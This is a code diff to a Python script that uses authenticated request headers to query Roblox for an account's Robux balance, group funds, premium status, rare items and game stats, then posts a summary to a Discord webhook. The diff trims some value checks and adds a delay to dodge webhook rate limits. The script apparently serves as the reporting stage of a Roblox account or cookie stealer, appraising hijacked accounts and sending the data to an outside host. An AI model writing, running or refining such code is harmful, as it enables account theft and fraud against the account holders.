@@ -4,6 +4,7 @@ import os
 import requests
 import re
 from datetime import datetime, timezone
+import time
 
 def safe_get(url, headers=None, default=None):
     try:
@@ -12,7 +13,7 @@ def safe_get(url, headers=None, default=None):
         if res.status_code == 200:
             return res.json()
         else:
-            print(f"DEBUG FAIL {url} -> Response: {res.text[:150]}", file=sys.stderr)
+            print(f"DEBUG FAIL {url} -> Status: {res.status_code}", file=sys.stderr)
     except Exception as e:
         print(f"DEBUG GET Exception on {url}: {e}", file=sys.stderr)
     return default
@@ -96,49 +97,18 @@ def main():
                 except Exception:
                     pass
 
-            # 3. Robux Balance & Pending Robux
+            # 3. Robux Balance & Resilient Pending/Currency Check
             economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
             robux_balance = economy_data.get("robux", 0) if economy_data else 0
-            
-            # Transactions check
-            trans_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=PendingRobux&limit=100", headers)
-            if trans_res and "data" in trans_res:
-                for t in trans_res.get("data", []):
-                    cur = t.get("currency")
-                    if isinstance(cur, dict):
-                        amt = cur.get("amount", 0)
-                        if amt:
-                            pending_robux += amt
 
-            purchase_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Purchase&limit=100", headers)
-            if purchase_res and "data" in purchase_res:
-                for t in purchase_res.get("data", []):
-                    cur = t.get("currency")
-                    if isinstance(cur, dict):
-                        amt = cur.get("amount", 0)
-                        if amt:
-                            total_spent_gamepasses += abs(amt)
-
-            # 4. RAP & Limiteds via Rolimons
-            rolimons_data = safe_get(f"https://www.rolimons.com/api/playeritems/{user_id}")
-            if rolimons_data and rolimons_data.get("success"):
-                player_assets = rolimons_data.get("playerAssets", {})
-                limiteds_count = len(player_assets)
-                for asset_id, item_details in player_assets.items():
-                    if isinstance(item_details, list) and len(item_details) > 2:
-                        # Rolimons format: [asset_status, value, rap, ...] -> RAP is typically index 2
-                        val = item_details[2]
-                        if isinstance(val, (int, float)):
-                            rap += int(val)
-
-            # 5. Games & Developer Stats
+            # 4. Games & Developer Stats
             created_games = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=10", headers, {}).get("data", [])
             if created_games:
                 is_developer = True
                 for g in created_games:
                     game_visits += g.get("rootPlace", {}).get("visits", 0)
 
-            # 6. Inventory Items (Korblox & Headless Check)
+            # 5. Inventory Items (Korblox & Headless Check)
             has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers, False)
             has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers, False)
 
@@ -149,7 +119,7 @@ def main():
                 h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers, {})
                 has_headless = len(h_res.get("data", [])) > 0
 
-            # 7. Groups
+            # 6. Groups
             groups_data = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", headers, {}).get("data", [])
             for g in groups_data:
                 role = g.get("role", {})
@@ -159,7 +129,7 @@ def main():
                     g_currency = safe_get(f"https://economy.roblox.com/v1/groups/{gid}/currency", headers, {}).get("robux", 0)
                     group_balance += g_currency
 
-            # 8. Premium
+            # 7. Premium
             is_premium = safe_get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers, False)
 
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
@@ -203,6 +173,8 @@ def main():
             }]
         }
 
+        # Add a 1 second pause to prevent Discord 429 Rate Limits
+        time.sleep(1)
         res = requests.post(webhook_url, json=payload, timeout=10)
         print(f"DEBUG: Discord Webhook Post Status: {res.status_code}", file=sys.stderr)
 
